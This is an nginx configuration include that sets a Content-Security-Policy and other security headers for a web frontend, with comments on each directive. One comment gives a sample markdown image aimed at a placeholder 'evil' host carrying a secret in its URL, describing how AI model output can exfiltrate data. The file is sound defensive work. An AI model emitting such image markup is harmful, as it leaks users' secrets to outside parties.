# Security headers for everything the frontend serves.
#
# Included in every `location` that sets a header of its own: nginx only
# inherits `add_header` from the enclosing block when the inner block declares
# none, so one extra `add_header` (a Cache-Control, say) silently drops all of
# these. Keeping them in one file makes that mistake hard to repeat.
#
# HSTS is added by the ingress, which terminates TLS.

# What this page may load and run. The app is self-contained, so:
#   script-src 'self'      only our own bundled scripts; no inline scripts, no eval.
#                          An injected <script> or onclick= does not run.
#   img-src 'self' ...     no images from other sites. Besides tracking, this
#                          closes the classic LLM data-exfiltration route:
#                          model output containing ![](https://evil/?q=<secret>).
#   connect-src 'self'     fetch / WebSocket / EventSource only to our own API.
#   style-src 'unsafe-inline'  React and the graph library set inline styles;
#                          styles cannot run code, so this is the accepted trade.
#   frame-ancestors 'self' nobody else may frame the app (clickjacking).
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self'; worker-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'" always;

add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;
